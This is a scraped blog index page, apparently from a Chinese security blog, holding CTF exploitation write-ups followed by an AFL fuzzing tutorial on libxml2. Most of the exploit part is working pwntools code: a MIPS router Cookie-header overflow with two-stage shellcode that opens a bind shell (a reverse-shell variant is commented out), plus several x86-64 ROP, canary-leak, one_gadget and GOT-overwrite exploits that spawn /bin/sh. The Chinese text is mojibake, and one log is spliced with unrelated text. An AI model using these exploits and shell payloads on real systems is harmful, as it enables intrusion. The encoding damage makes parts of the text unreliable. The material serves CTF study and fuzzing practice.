&lt;pre&gt;&lt;code&gt;Nope you can just jump to shellcode On a real router u would have needed to rop to sleep or flush the cache another way Or find a way to write ur code without a decoder...u don&#39;t need to deal with cache coherence unless ur code modifies itself
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰∏çÈúÄË¶ÅËÄÉËôëcache incohorencyÔºåÁõ¥Êé•Ë∑≥ËΩ¨ÊâßË°åshellcode&lt;br&gt;
‰∏çËøáËØ•ÊºèÊ¥ûËß¶ÂèëÊó∂‰ºöË∞ÉÁî®&lt;code&gt;toUpper()&lt;/code&gt;Â∞ÜÂ∞èÂÜôÂ≠óÊØçËΩ¨Êç¢‰∏∫Â§ßÂÜôÂ≠óÊØç&lt;br&gt;
stage1ËÄÉËôëÊûÑÈÄ†&lt;code&gt;read&lt;/code&gt;ÁªïËøáÔºå&lt;code&gt;read(socketfd,buf,size)&lt;/code&gt;&lt;br&gt;
&lt;code&gt;shellcraft&lt;/code&gt;‰∏≠ÁöÑ&lt;code&gt;findpeer&lt;/code&gt;ÂèØ‰ª•Áõ¥Êé•Â∞Ü&lt;code&gt;socketfd&lt;/code&gt;Â≠òÂÖ•&lt;code&gt;$s0&lt;/code&gt;‰∏≠&lt;br&gt;
stage2ËØªÂÖ•ÂèçÂºπshellÁöÑshellcodeÔºåËøôÈáåÊñπÊ≥ï‰∏çÂîØ‰∏ÄÔºåÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫é&lt;br&gt;
&lt;code&gt;bindsh&lt;/code&gt; &amp;amp; &lt;code&gt;connect+dupsh&lt;/code&gt; &amp;amp; &lt;code&gt;findpeersh&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(arch=&#39;mips&#39;, endian=&#39;big&#39;, os=&#39;linux&#39;)

nop = asm(&#39;addiu $a0, $a0, 0x4141&#39;)
avoid = string.ascii_lowercase.encode() + b&amp;quot;\x00&amp;quot;
addr = 0x7c7ffa90

# sh = listen(1440)
io = remote(&#39;192.168.0.1&#39;, 80)

# stage 1
# find peer socketfd and save it to $s0
sc = asm(shellcraft.findpeer(io.lport))
# read sc2 to addr
sc += asm(shellcraft.read(&#39;$s0&#39;, addr, 0x200))
sc += asm(f&#39;&#39;&#39;
    lui $t9, {addr &amp;gt;&amp;gt; 16}
    ori $t9, $t9, {addr &amp;amp; 0xffff}
    jalr $t9
    addiu $a0, $a0, 0x4141
&#39;&#39;&#39;)

print(&amp;quot;sc::&amp;quot;, sc)


assert all(c not in avoid for c in sc)


payload = b&amp;quot;A&amp;quot;*0x10+p32(addr)+nop*100+sc

request = b&amp;quot;GET /loginFs/passwd HTTP/1.1\r\n&amp;quot;
request += b&amp;quot;Host: 192.168.0.1\r\n&amp;quot;
request += b&amp;quot;Referer: http://192.168.0.1/\r\n&amp;quot;
request += b&amp;quot;Cookie: &amp;quot;+payload+b&amp;quot;\r\n&amp;quot;
request += b&amp;quot;Upgrade-Insecure-Requests: 1\r\n&amp;quot;
request += b&amp;quot;\r\n&amp;quot;

io.send(request)

pause()

# stage 2
# sc2 = asm(shellcraft.findpeersh(io.lport))
# sc2 = asm(shellcraft.connect(&amp;quot;192.168.0.2&amp;quot;, 1440))+asm(shellcraft.dupsh())
sc2 = asm(shellcraft.bindsh(1440))

io.send(sc2)

io.interactive()

# sh.wait_for_connection()
# sh.interactive()
log.progress(&amp;quot;connecting to shell&amp;quot;)
sh1 = remote(&amp;quot;192.168.0.1&amp;quot;, 1440)
sh1.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dam_add1&#34;&gt;dam_add1:&lt;/h3&gt;
&lt;p&gt;‰∏ªÂáΩÊï∞whileÂæ™ÁéØÔºåËæìÂÖ•Â≠óÊØçËß¶Âèë&lt;code&gt;stoi&lt;/code&gt;ÂºÇÂ∏∏Â§ÑÁêÜÈÄÄÂá∫Âæ™ÁéØÔºåË¶ÜÁõñ&lt;code&gt;rbp&lt;/code&gt;‰∏∫ÂèØÂÜôÂú∞ÂùÄÔºå&lt;code&gt;ret&lt;/code&gt;‰∏∫&lt;code&gt;landingpad+1&lt;/code&gt;&lt;br&gt;
ÂØªÊâæ&lt;code&gt;landingpad&lt;/code&gt;‰∏ÄËà¨ÊñπÊ≥ï:&lt;br&gt;
Look around in &lt;code&gt;libstdc++&lt;/code&gt; for a &lt;code&gt;catch&lt;/code&gt; block that just ignores the exception and returns from its function: &lt;a href=&#34;https://github.com/gcc-mirror/gcc/blob/4b8e7b57d952a1031b0fe11533ef76b9821432c0/libstdc%2B%2B-v3/src/c%2B%2B98/ios_init.cc#L144&#34;&gt;https://github.com/gcc-mirror/gcc/blob/4b8e7b57d952a1031b0fe11533ef76b9821432c0/libstdc%2B%2B-v3/src/c%2B%2B98/ios_init.cc#L144&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A good way to narrow down the search space is to search for references to &lt;code&gt;__cxa_end_catch&lt;/code&gt;, which is called by &lt;code&gt;catch&lt;/code&gt; blocks that do not rethrow the exception.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./add1&amp;quot;)
elf = ELF(&amp;quot;./add1&amp;quot;)
libc = elf.libc


def add(cc):
    io.sendlineafter(b&amp;quot;Enter a number: &amp;quot;, cc)

# gdb.attach(io, &#39;b *0x555555569db7&#39;)
# gdb.attach(io)
# pause()


# leak canary
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x18
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x18)
canary = u64(io.recv(7).rjust(8, b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))

# leak libc_base
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x37
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x37)
libc_base = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;)) - 0x29d90
log.success(&amp;quot;libc_base: &amp;quot;+hex(libc_base))

# leak elf_base
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x47
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x47)
elf_base = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;)) - 0x157a5
log.success(&amp;quot;elf_base: &amp;quot;+hex(elf_base))

# leak stack_addr
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x57
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x57)
stack_addr = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))


ogg = libc_base+0xebc88
target = elf_base + 0x000b3ed4
pop_rsi = libc_base+0x000000000002be51
pop_rdx_r12 = libc_base+0x000000000011f2e7
landingpad = elf_base + 0x17731

# 0x55555556acb7 &amp;lt;__cxa_throw+55&amp;gt;    call   _Unwind_RaiseException@plt                &amp;lt;_Unwind_RaiseException@plt&amp;gt;
# gdb.attach(io, &#39;b *$rebase(0x16cb7)&#39;)
gdb.attach(io)

payload = cyclic(0x30)+p64(stack_addr) + \
    p64(landingpad+1)+p64(0xdeadbeef)+p64(pop_rdx_r12) + \
    p64(0)*2+p64(pop_rsi)+p64(0)+p64(ogg)
print(f&amp;quot;offset:{cyclic_find(0x6161616461616163)}&amp;quot;)  # offset: 8

add(payload)

io.interactive()

# 0x50a47 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebc81 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebc85 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebc88 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebce2 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebd3f execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebd43 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;das_exception&#34;&gt;das_exception:&lt;/h3&gt;
&lt;p&gt;Âä´ÊåÅmainËøîÂõûÂú∞ÂùÄÔºåÊ≠£Â∏∏Ê†àÂõûÈÄÄÂèØ‰ª•getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./exception&amp;quot;)
# io = remote(&amp;quot;node5.buuoj.cn&amp;quot;, 27319)
elf = ELF(&amp;quot;./exception&amp;quot;)
libc = elf.libc


io.sendafter(b&amp;quot;name\n&amp;quot;, b&amp;quot;%7$p.%9$p.%11$p.&amp;quot;)
canary = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)
base_addr = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)-0x1480
leak_addr = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)-0x24083
log.success(&amp;quot;canary: &amp;quot;+hex(canary))
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

io.recvuntil(b&amp;quot;stack\n&amp;quot;)
stack_addr = int(io.recvuntil(b&amp;quot;\n&amp;quot;, drop=True), 16)
log.success(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

gdb.attach(io, &#39;b *0x7ffff7ddb093&#39;)

ogg = leak_addr+0xe3afe
pop_rdi = leak_addr+0x0000000000023b6a
pop_r12 = leak_addr+0x00000000001143a1
str_sh = leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr = leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload = b&amp;quot;a&amp;quot;*0x68+p64(canary) + \
    p64(stack_addr+0xa0)+p64(base_addr+0x1408) + \
    p64(canary)*5+p64(pop_r12)+p64(0)+p64(ogg)

# payload = b&amp;quot;aaaaaaaa&amp;quot;

io.sendafter(b&amp;quot;exception?\n&amp;quot;, payload)

io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;plaid_valor-not&#34;&gt;plaid_valor-not:&lt;/h3&gt;
&lt;p&gt;off-by-one+oobÔºåÁõ¥Êé•ÁúãÊ∫êÁ†Å:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

# io = process(&amp;quot;./valor-not&amp;quot;)
io = remote(&amp;quot;valornt.chal.pwni.ng&amp;quot;, 1337)
elf = ELF(&amp;quot;./valor-not&amp;quot;)


def conf():
    # io.sendlineafter(b&amp;quot;n): &amp;quot;, b&amp;quot;y&amp;quot;)
    io.sendline(b&amp;quot;y&amp;quot;)


# gdb.attach(io)
# pause()
# bypass cheater_checker
io.sendlineafter(b&amp;quot;Choose your weapon: \n&amp;quot;, b&amp;quot;3&amp;quot;)
conf()
io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x50+b&amp;quot;cheater&amp;quot;)
conf()
io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x64+p64(1))

# padding
for i in range(6):
    io.sendlineafter(b&amp;quot;Choose your weapon: \n&amp;quot;, b&amp;quot;3&amp;quot;)
    conf()

    io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;s&amp;quot;*0x1+b&amp;quot;heck&amp;quot;)

# bypass enemy_team check
io.sendlineafter(b&amp;quot;offs? \n&amp;quot;, b&amp;quot;y&amp;quot;)
io.sendline(b&amp;quot;heck&amp;quot;+b&amp;quot;a&amp;quot;*0x5c)
# conf()
# io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x64)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;das_control&#34;&gt;das_control:&lt;/h3&gt;
&lt;p&gt;vuln‰∏≠Ê∫¢Âá∫ÊäõÂá∫ÂºÇÂ∏∏,Ë¶ÜÁõñ&lt;code&gt;rbp&lt;/code&gt;‰∏∫&lt;code&gt;gift&lt;/code&gt;Ôºå‰πãÂêéÊâìÊ†àËøÅÁßª&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

# io = process(&amp;quot;./control&amp;quot;)
io = remote(&amp;quot;node5.buuoj.cn&amp;quot;, 26788)
elf = ELF(&amp;quot;./control&amp;quot;)
libc = elf.libc

pop_rax = 0x0000000000462c27  # pop rax; ret;
syscall_ret = 0x000000000042f494  # syscall; ret;
pop_rdi = 0x0000000000401c72  # pop rdi; ret;
pop_rsi = 0x0000000000405285  # pop rsi; ret;
pop_rdx = 0x0000000000401aff  # pop rdx; ret;
read_text = 0x402221
# 0x000000000045baa3: mov rdx, qword ptr [rsi + 6]; mov qword ptr [rdi], rcx; mov qword ptr [rdi + 6], rdx; ret;
magic_gadget = 0x000000000045baa3
# vuln =

io.sendafter(b&amp;quot;Gift&amp;gt; &amp;quot;, p64(magic_gadget)+p64(read_text))

# gdb.attach(io, &#39;b *0x000000000045baa3\nset follow-fork-mode parent\n&#39;)

payload = cyclic(0x70)+p64(0x4D3348)+p64(0x04021fa+1)
io.sendafter(b&amp;quot;control?\n&amp;quot;, payload)

payload = b&amp;quot;/bin/sh\x00&amp;quot;+p64(pop_rdi)+p64(0x4d3350)+p64(pop_rdx) + \
    p64(0)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)
io.sendafter(b&amp;quot;again&amp;quot;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;d3note&#34;&gt;d3note:&lt;/h3&gt;
&lt;p&gt;Ë∂äÁïåËØªÂÜôÊîπgotË°®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc


def op114(c1, c2, cc):  # malloc
    io.sendline(str(0x114))
    io.sendline(str(c1))
    io.sendline(str(c2))
    io.sendline(cc)


def op514(c1):  # puts
    io.sendline(str(0x514))
    io.sendline(str(c1))


def op1919(c1):  # free
    io.sendline(str(0x1919))
    io.sendline(str(c1))


def op810(c1, cc):  # edit
    io.sendline(str(0x810))
    io.sendline(str(c1))
    io.sendline(cc)

# pause()


op114(0, 0x90, b&amp;quot;/bin/sh\x00&amp;quot;)
op1919(0)
op114(0, 0x90, b&amp;quot;/bin/sh\x00&amp;quot;)

op514(-0x39f)
leak_addr = u64(io.recv(6).ljust(8, b&#39;\x00&#39;))-libc.sym[b&amp;quot;setbuf&amp;quot;]
log.success(f&amp;quot;leak_addr: {hex(leak_addr)}&amp;quot;)

sys_addr = leak_addr + libc.sym[b&amp;quot;system&amp;quot;]

gdb.attach(io)

op114(-0xa, sys_addr &amp;amp; 0xffffffff, b&amp;quot;a&amp;quot;)
op1919(0)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ËøëÊúü‰∏Ä‰∫õÈ¢ò</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VX0_6BnfV/"" data-c="
          &lt;h2 id=&#34;libxml2&#34;&gt;libxml2Ôºö&lt;/h2&gt;
&lt;h3 id=&#34;ÂâçË®Ä&#34;&gt;ÂâçË®ÄÔºö&lt;/h3&gt;
&lt;p&gt;Êú¨ÊñáËÆ∞ÂΩïafl-trainingÁöÑÁ¨¨‰∏ÄÁØáÔºåÂ§çÁé∞&lt;code&gt;CVE-2015-7497&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;ÂáÜÂ§áÂ∑•‰Ωú&#34;&gt;ÂáÜÂ§áÂ∑•‰ΩúÔºö&lt;/h3&gt;
&lt;p&gt;ÊåâÁÖßÂÆòÊñπÊìç‰Ωú,Êú¨Êú∫‰∏ãÈù¢ÈúÄË¶ÅËÆæÁΩÆ‰∏ã‰∏¥Êó∂ÁéØÂ¢ÉÂèòÈáè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git submodule init &amp;amp;&amp;amp; git submodule update
cd libxml2
export CC=afl-clang-fast 
./autogen.sh 
export AFL_USE_ASAN=1 
make -j 4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êàë‰ª¨‰ΩøÁî®‰∫Ü&lt;code&gt;ASAN&lt;/code&gt;ÔºåÂç≥&lt;code&gt;address sanitizer&lt;/code&gt;Ôºå‰∏Ä‰∏™Âø´ÈÄüÁöÑÂÜÖÂ≠òÈîôËØØÊ£ÄÊµãÂ∑•ÂÖ∑ÔºåÂèØ‰ª•Âú®ÂÜÖÂ≠òÂàÜÈÖçÂ§±Ë¥•Êó∂Á´ãÂç≥ÈÄÄÂá∫Âπ∂ÊâìÂç∞ÈîôËØØ‰ø°ÊÅØÔºå‰ΩÜÊúâÁöÑÊÉÖÂÜµ‰∏ãÂÜÖÂ≠òÂàÜÈÖçÂ§±Ë¥•Âπ∂‰∏ç‰ºöÂØºËá¥Á®ãÂ∫èÂ¥©Ê∫É&lt;br&gt;
‰∏∫‰∫ÜÊñπ‰æøÂêéÈù¢fuzzÂêéÂ§ÑÁêÜcrashÔºåÊàë‰ª¨ÂèØ‰ª•ÂºÄÂêØ&lt;code&gt;ASAN&lt;/code&gt;Âπ∂ËÆæÁΩÆ‰∏¥Êó∂ÁéØÂ¢ÉÂèòÈáèÁ¶ÅÁî®&lt;code&gt;export ASAN_OPTIONS=detect_leaks=0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;‰∏çËøáÂºÄÂêØ&lt;code&gt;ASAN&lt;/code&gt;‰πãÂêéÁºñËØëÁöÑÊµãËØïÁ®ãÂ∫è&lt;code&gt;./testModule&lt;/code&gt;ËøêË°åÊó∂Êä•Èîô&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:/home/fk/ÊñáÊ°£/fuzzing/afl-training/challenges/libxml2/libxml2# ./testModule 
[-] FATAL: forkserver is already up, but an instrumented dlopen() library loaded afterwards. You must AFL_PRELOAD such libraries to be able to fuzz them or LD_PRELOAD to run outside of afl-fuzz.
To ignore this set AFL_IGNORE_PROBLEMS=1 but this will lead to ambiguous coverage data.
In addition, you can set AFL_IGNORE_PROBLEMS_COVERAGE=1 to ignore the additional coverage instead  is going to be easy to
fuzz, is definitely exposed to user-provided input in many situations, and is at high risk of containing bugs (parsing a
complex data format in an unsafe language).

This functionality is exposed in the [parser](http://xmlsoft.org/html/libxml-parser.html) API, and whilst you could dig
through this documentation, the easiest approach is to look at an example.
[`parse1.c`](http://xmlsoft.org/examples/parse1.c) (also in the (use with caution!).
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êúâ‰∫∫ÊèêËøáÁ±ª‰ººÁöÑissue &lt;a href=&#34;https://coder.social/antonio-morales/fuzzing101/issues/21&#34;&gt;https://coder.social/antonio-morales/fuzzing101/issues/21&lt;/a&gt;&lt;br&gt;
ËøΩÊ∫ØÂà∞ÂÆòÊñπFAQÊúâ‰∏§ÁßçËß£ÂÜ≥ÊñπÊ°àÔºå‰∏ÄÁßçÊòØËÆæÁΩÆ‰∏¥Êó∂ÁéØÂ¢ÉÂèòÈáè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export AFL_PRELOAD=foo.so
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩÜÊòØÁ¨îËÄÖËÆæÁΩÆ‰πãÂêé‰ªçÁÑ∂Êä•ÈîôÔºå‰∏îÂú®Êú¨Êú∫Ê£ÄÁ¥¢ÂêéÂπ∂Êú™ÊâæÂà∞&lt;code&gt;foo.so&lt;/code&gt;&lt;br&gt;
(&lt;code&gt;foo.so&lt;/code&gt;ÂÖ∂ÂÆûÂπ∂‰∏çÊòØ‰ªÄ‰πà‰∏úË•øÔºå&lt;code&gt;foo&lt;/code&gt;ÁöÑÊú¨ÊÑèÂ∞±ÊòØÊó†ÊÑè‰πâÔºåÂæóstraceÈôÑÂä†ËøõÁ®ã‰∏äÁúãÁõ∏ÂÖ≥ÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì&lt;/p&gt;
&lt;p&gt;Á¨¨‰∫åÁßçËÆæÁΩÆ‰∏¥Êó∂ÁéØÂ¢ÉÂèòÈáèÂøΩÁï•ÂêéÊµãËØïÊàêÂäü&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export AFL_IGNORE_PROBLEMS=1 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ÁºñÂÜôharness&#34;&gt;ÁºñÂÜôharnessÔºö&lt;/h3&gt;
&lt;p&gt;‰ª•‰∏äÊàë‰ª¨Âπ∂Êú™ÁîüÊàêfuzzÊâÄÈúÄÁöÑÂÖ•Âè£Á®ãÂ∫èÔºåÊ†πÊçÆÂÆòÊñπÊñáÊ°£ÊâÄËØ¥ÔºåÂç≥ÊòØÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™&lt;code&gt;fuzzing harness&lt;/code&gt;ÔºåÁ¨îËÄÖ‰πüÊòØÁ¨¨‰∏ÄÊ¨°ÔºåÊâÄ‰ª•Ë∑üÁùÄÂÆòÊñπÊñáÊ°£ÁöÑhintËµ∞‰∫Ü&lt;br&gt;
Ê†πÊçÆÂÆòÊñπÊñáÊ°£ÊèèËø∞&lt;code&gt;libxml2&lt;/code&gt;ÁöÑapiÂæàÂ§öÔºå‰ΩÜÊòØÊúÄÂÆπÊòìËøõË°åÊ®°Á≥äÊµãËØïÁöÑÊòØÊ†∏ÂøÉXMLËß£ÊûêÈÄªËæëÔºåÂõ†‰∏∫ÂÆÉÊö¥Èú≤Âú®&lt;code&gt;Áî®Êà∑ËæìÂÖ•&lt;/code&gt;ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØËÉΩÂú®Â§ÑÁêÜ‰∏çÂÆâÂÖ®ÁöÑÂ§çÊùÇÊï∞ÊçÆÊó∂Âá∫Áé∞bug&lt;br&gt;
Ê†πÊçÆÂÆòÊñπÁªôÁöÑexample&lt;a href=&#34;http://xmlsoft.org/examples/parse1.c&#34;&gt;http://xmlsoft.org/examples/parse1.c&lt;/a&gt;ÂèØ‰ª•Ëá™Â∑±Â§ßÊ¶ÇÊîπ‰∏Ä‰∏™Ôºå‰ªéÂëΩ‰ª§Ë°åËØªÂÖ•Êñá‰ª∂ÂêçÁöÑharness&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */

    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &amp;quot;Failed to parse %s\n&amp;quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩøÁî®‰ª•‰∏ãÊåá‰ª§ÁºñËØë&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast ./fuzz.c -I ./include ./.libs/libxml2.a -lz -lm -g -o fuzzer 

#-I ÊåáÂÆöincludeÁõÆÂΩïÂíålibxml2ÁöÑÈùôÊÄÅÈìæÊé•Â∫ì
#-lm‰ΩøÁî®mathÂ∫ìÔºå-lz‰ΩøÁî®zlibÂ∫ìÔºå-gÂºÄÂêØdebugÊ®°Âºè

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êä•Èîô&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[-] PROGRAM ABORT : Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!
         Location : check_asan_opts(), src/afl-fuzz-init.c:2651
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êü•ËØ¢Áõ∏ÂÖ≥issue:&lt;a href=&#34;https://groups.google.com/g/afl-users/c/XaE06yzKOu8&#34;&gt;https://groups.google.com/g/afl-users/c/XaE06yzKOu8&lt;/a&gt;&lt;br&gt;
ÂÜçÊ¨°ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export ASAN_OPTIONS=abort_on_error=1:symbolize=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•Ê≠£Â∏∏fuzz&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223602862.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;‰ºòÂåñharness&#34;&gt;‰ºòÂåñharnessÔºö&lt;/h3&gt;
&lt;p&gt;‰ΩÜÊòØÂ§™ÊÖ¢‰∫ÜÔºåÊàë‰ª¨Ê†πÊçÆafl++ÊñáÊ°£ÂèØ‰ª•Ê∑ªÂä†‰∏ÄÁÇπ‰ºòÂåñ&lt;br&gt;
Ê≥®ÊÑè‰∏çÂøÖË¶ÅËØ≠Âè•ÁöÑÂà†Èô§Ôºå‰∏ãÈù¢ÊòØÂ§±Ë¥•Á§∫‰æã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while(__AFL_LOOP(1000)){
    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &amp;quot;Failed to parse %s\n&amp;quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊàêÂäüÁ§∫‰æãÔºåÊ≥®ÊÑè‰∏§ËÄÖÂå∫Âà´Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv)
{
    if (argc != 2)
        return (1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while (__AFL_LOOP(1000))
    {
        doc = xmlReadFile(argv[1], NULL, 0);
        if (doc != NULL)
        {
            xmlFreeDoc(doc);
        }
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return (0);
}
